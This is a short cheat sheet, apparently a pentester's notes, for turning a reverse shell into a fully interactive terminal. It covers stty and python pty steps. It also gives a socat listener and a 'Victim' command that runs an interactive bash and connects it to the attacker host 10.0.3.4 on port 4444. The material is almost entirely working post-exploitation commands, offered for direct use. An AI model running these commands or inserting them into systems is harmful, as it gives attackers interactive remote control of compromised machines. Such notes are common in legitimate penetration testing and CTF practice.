# https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

### stty options
# In reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
stty raw -echo
fg

# In reverse shell
reset
export SHELL=bash;export TERM=xterm-256color;stty rows 48 columns 198

### socat
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
